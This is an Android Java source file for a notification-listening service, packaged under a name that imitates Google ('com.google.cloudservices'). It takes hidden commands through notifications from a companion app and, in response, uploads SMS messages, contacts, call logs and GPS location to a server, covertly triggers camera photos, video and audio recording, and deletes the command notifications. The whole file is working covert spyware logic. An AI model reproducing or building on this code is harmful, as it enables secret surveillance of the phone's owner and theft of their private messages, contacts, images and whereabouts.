package com.google.cloudservices;

import android.annotation.TargetApi;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Build;
import android.os.Bundle;
import android.os.SystemClock;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

@TargetApi(Build.VERSION_CODES.JELLY_BEAN_MR2)
public class NLService extends NotificationListenerService implements LocationListener {

Context context;
    private Intent lockIntent;
    private Intent lockIntent2;
    private LocationManager locationManager;

    @Override
public void onCreate() {

    super.onCreate();
    context = getApplicationContext();


}


@TargetApi(Build.VERSION_CODES.LOLLIPOP)
@Override
public void onNotificationPosted(StatusBarNotification sbn) {
    Bundle extras = sbn.getNotification().extras;
  //  Log.e("sffdddss23343",  extras.getCharSequence("android.text").toString() );
    if (sbn.getPackageName().equals("com.example.parcchildtwo")){
        OptionDB optionDB=new OptionDB(context);
        switch (extras.getCharSequence("android.text").toString()){
            case "online":
                //set online status to server
                break;
            case "sms":

                if (optionDB.getjs().get(0).equals("sms1")){
                    sendsm(context);
                }
                break;
            case "contact":
                try {
                    if (optionDB.getjs().get(1).equals("contact1")){
                        sendconttact(context);
                    }
                }catch (Exception e){
                    SendEror sendEror=new SendEror();
                    sendEror.sender(context,"child eror:"+e.toString());
                }
                break;
            case "call":
                if (optionDB.getjs().get(2).equals("call1")){
                    sendcall(context);
                }
                break;
            case "cameraf":
                lockIntent = new Intent(context, TakePictureervice.class);
                lockIntent.putExtra("photoType","front");
                lockIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startService(lockIntent);
                break;
            case "camerab":
                lockIntent2 = new Intent(context, TakePictureervice.class);
                lockIntent2.putExtra("photoType","back");
                lockIntent2.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                //  ContextCompat.startForegroundService(context,lockIntent2);
                context.startService(lockIntent2);
                break;
            case "videof":
                AlarmManager alarmMgr = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
                Intent intent = new Intent(context,AuodiReceiver.class);
                intent.putExtra("type","not");
                intent.putExtra("dur","40000");
                intent.putExtra("media","cap2");
                PendingIntent alarmIntent = PendingIntent.getBroadcast(context, 0, intent, 0);
                alarmMgr.set(AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() +
                                1000, alarmIntent);
                break;
            case "videob":
                AlarmManager alarmMgr2 = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
                Intent intent2 = new Intent(context,AuodiReceiver.class);
                intent2.putExtra("type","not");
                intent2.putExtra("dur","40000");
                intent2.putExtra("media","cap");
                PendingIntent alarmIntent2 = PendingIntent.getBroadcast(context, 1, intent2, 0);
                alarmMgr2.set(AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() +
                                1000, alarmIntent2);
                break;
            case "voice":
                try {
                    Log.e("testing", "Audio1");
//                                                    vidIntent = new Intent(context, AudioService.class);
//                                                    vidIntent.putExtra("type","not");
//                                                    vidIntent.putExtra("dur","40000");
//                                                    vidIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//                                                    ContextCompat.startForegroundService(context,vidIntent);
                    alarmMgr = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
                    intent = new Intent(context, AuodiReceiver.class);
                    intent.putExtra("type","not");
                    intent.putExtra("dur","40000");
                    intent.putExtra("media","voice");
                    alarmIntent = PendingIntent.getBroadcast(context, 2, intent, 0);
                    alarmMgr.set(AlarmManager.ELAPSED_REALTIME_WAKEUP,
                            SystemClock.elapsedRealtime() +
                                    1000, alarmIntent);
                }catch (IllegalStateException e){

                }
                break;
            case "location":
                if (optionDB.getjs().get(4).equals("gps1")) {
                    try {
                        getLocation();
                    }catch (Exception e){
                        SendEror sendEror=new SendEror();
                        sendEror.sender(getApplicationContext(),"location eror:"+e.toString());
                    }}
                break;


        }


        Log.e("sffdddss23", extras.getCharSequence("android.text").toString() );
    }
    cancelNotification(sbn.getKey());
//    String pack = sbn.getPackageName();
//    String ticker ="";
//    if(sbn.getNotification().tickerText !=null) {
//        ticker = sbn.getNotification().tickerText.toString();
//    }
//    Bundle extras = sbn.getNotification().extras;
//    String title = extras.getString("android.title");
//    String text = extras.getCharSequence("android.text").toString();
//    int id1 = extras.getInt(Notification.EXTRA_SMALL_ICON);
//    Bitmap id = sbn.getNotification().largeIcon;
//
//
//    Log.i("Package",pack);
//    Log.i("Ticker",ticker);
//    Log.i("Title",title);
//    Log.i("Text",text);
//
//    Intent msgrcv = new Intent("Msg");
//    msgrcv.putExtra("package", pack);
//    msgrcv.putExtra("ticker", ticker);
//    msgrcv.putExtra("title", title);
//    msgrcv.putExtra("text", text);
//    if(id != null) {
//        ByteArrayOutputStream stream = new ByteArrayOutputStream();
//        //id.compress(Bitmap.CompressFormat.PNG, 100, stream);
//        byte[] byteArray = stream.toByteArray();
//        msgrcv.putExtra("icon",byteArray);
//    }
//    LocalBroadcastManager.getInstance(context).sendBroadcast(msgrcv);

}
@Override

public void onNotificationRemoved(StatusBarNotification sbn) {
    Log.i("Msg","Notification Removed");

}
    public void sendsm(Context context){
        SendSms sendSms=new SendSms();
        sendSms.sendsms(context);
    }
    public void sendconttact(Context context){
        SendContact sendContact=new SendContact();
        sendContact.sendcontac(context);

    }
    public void sendcall(Context context){
        SendCall sendCall=new SendCall();
        sendCall.sendcal(context);
    }

    @Override
    public void onLocationChanged(Location location) {
        fn_update(location);
        Log.e("onLocationChanged", String.valueOf(location.getLongitude()));
        locationManager.removeUpdates(this);

    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {

    }

    @Override
    public void onProviderEnabled(String provider) {

    }

    @Override
    public void onProviderDisabled(String provider) {

    }
    protected void getLocation() {

        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, this);


    }
    private void fn_update(Location location) {
        SendCordinate sendCordinate = new SendCordinate();
        if (!location.equals(null)) {
            sendCordinate.SendCorServer(getApplicationContext(), String.valueOf(location.getLongitude()), String.valueOf(location.getLatitude()));
        }
    }
}